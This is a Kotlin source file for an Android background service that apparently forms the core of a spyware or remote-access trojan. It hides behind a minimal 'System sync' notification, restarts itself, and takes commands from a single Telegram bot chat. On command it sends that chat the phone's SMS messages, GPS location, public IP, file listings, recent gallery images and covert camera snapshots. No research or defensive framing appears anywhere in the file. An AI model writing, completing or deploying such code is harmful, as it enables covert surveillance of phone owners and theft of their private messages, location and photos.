package com.rajput.info

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class DeviceService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var running = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notif = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System sync")
            .setContentText("active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(NOTIF_ID, notif, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIF_ID, notif)
        }
        if (!running) {
            running = true
            scope.launch { runLoop() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        scope.cancel()
        super.onDestroy()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(NotificationManager::class.java)
            val ch = NotificationChannel(CHANNEL_ID, "System sync", NotificationManager.IMPORTANCE_MIN)
            ch.setShowBadge(false)
            nm.createNotificationChannel(ch)
        }
    }

    private suspend fun runLoop() {
        val id = DeviceIdentity(this)
        val code = id.code()
        val name = id.name()
        val label = "<b>[$name]</b>\n"

        delay(1500)
        TelegramApi.sendMessage(
            label + "🟢 online\n" +
            "Model: ${Build.MANUFACTURER} ${Build.MODEL}\n" +
            "Android: ${Build.VERSION.RELEASE}\n" +
            "Commands: /info /ip /loc /sms /files /gallery /cam /help"
        )

        pollLoop(code, label)
    }

    private suspend fun pollLoop(code: String, label: String) {
        val prefs = getSharedPreferences("poll", Context.MODE_PRIVATE)
        var offset = prefs.getLong("offset", 0L)

        delay(2000)
        while (running && isActive) {
            try {
                val updates = withContext(Dispatchers.IO) { TelegramApi.getUpdates(offset, 25) }
                if (updates != null && updates.length() > 0) {
                    for (i in 0 until updates.length()) {
                        val u = updates.optJSONObject(i) ?: continue
                        offset = u.optLong("update_id", 0L) + 1
                        prefs.edit().putLong("offset", offset).apply()

                        val msg = u.optJSONObject("message") ?: continue
                        val chat = msg.optJSONObject("chat") ?: continue
                        if (chat.optLong("id") != BotConfig.CHAT_ID) continue
                        val text = msg.optString("text", "").trim()
                        if (text.isEmpty()) continue
                        withContext(Dispatchers.IO) { handle(text, code, label) }
                    }
                }
            } catch (_: Exception) {}
            delay(500)
        }
    }

    private fun handle(cmd: String, code: String, label: String) {
        when {
            cmd.startsWith("/help") || cmd.startsWith("/start") ->
                TelegramApi.sendMessage(
                    label +
                    "/info — device\n" +
                    "/ip — public IP + geo\n" +
                    "/loc — gps coords\n" +
                    "/sms — last 30 sms\n" +
                    "/files — dir listing\n" +
                    "/gallery — 3 recent images\n" +
                    "/cam — camera snapshot"
                )
            cmd.startsWith("/info") ->
                TelegramApi.sendMessage(label + Collectors.deviceInfo(this))
            cmd.startsWith("/ip") ->
                TelegramApi.sendMessage(label + Collectors.ipInfo())
            cmd.startsWith("/loc") ->
                TelegramApi.sendMessage(label + Collectors.location(this))
            cmd.startsWith("/sms") -> {
                val dump = Collectors.sms(this)
                dump.chunked(3500).forEach { TelegramApi.sendMessage(label + it) }
            }
            cmd.startsWith("/files") ->
                TelegramApi.sendMessage(label + Collectors.listFiles())
            cmd.startsWith("/gallery") -> {
                val imgs = Collectors.recentImages(this, 3)
                if (imgs.isEmpty()) TelegramApi.sendMessage(label + "no images / permission denied")
                else imgs.forEach { (n, bytes) -> TelegramApi.sendPhoto(bytes, label + n) }
            }
            cmd.startsWith("/cam") -> {
                val bytes = runBlocking { CameraSnap.capture(this) }
                if (bytes == null) TelegramApi.sendMessage(label + "camera fail")
                else TelegramApi.sendPhoto(bytes, label + "cam ${System.currentTimeMillis()}")
            }
            else -> TelegramApi.sendMessage(label + "unknown: $cmd")
        }
    }

    companion object {
        const val CHANNEL_ID = "sync_channel"
        const val NOTIF_ID = 101
        fun start(ctx: Context) {
            val i = Intent(ctx, DeviceService::class.java)
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i)
            else ctx.startService(i)
        }
    }
}
